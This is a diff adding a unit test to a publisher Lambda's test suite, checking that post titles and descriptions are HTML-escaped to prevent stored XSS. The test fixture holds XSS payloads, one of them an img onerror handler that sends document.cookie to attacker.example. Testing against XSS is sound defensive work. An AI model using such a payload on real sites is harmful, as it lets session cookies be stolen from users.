@@ -248,6 +248,31 @@ describe('Publisher Lambda - generateJekyllPost', () => {
     const post = generateJekyllPost(metaWithQuotes, hlsUrl, captionPath);
     expect(post).toContain('title: "Event \\"Special\\" Edition"');
   });
+
+  it('HTML-escapes title and description in the body to prevent stored XSS (issue #87)', () => {
+    const malicious = {
+      ...metadata,
+      title: '<script>alert("xss")</script>',
+      description: '<img src=x onerror=fetch("https://attacker.example/?c="+document.cookie)>',
+    };
+    const post = generateJekyllPost(malicious, hlsUrl, captionPath);
+
+    // Slice to just the body so we don't false-positive on the platform's
+    // own <script>/<video> tags in the rendered HLS player block.
+    const bodyStart = post.indexOf('\n---\n') + 5;
+    const body = post.slice(bodyStart);
+
+    // The escaped forms ARE present (the angle brackets are now entities,
+    // so a browser will render the text literally rather than execute it).
+    expect(body).toContain('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
+    expect(body).toContain('&lt;img src=x onerror=fetch(&quot;');
+
+    // Anything in the body that looks like a real <script> tag must be one
+    // of the platform's own (HLS.js loader, player init) — never derived
+    // from user title/description. The opening `<script` doesn't appear
+    // adjacent to attacker's `alert("xss")` payload anywhere.
+    expect(body).not.toMatch(/<script[^>]*>alert\("xss"\)/);
+  });
 });
 
 describe('Publisher Lambda - escapeYaml', () => {
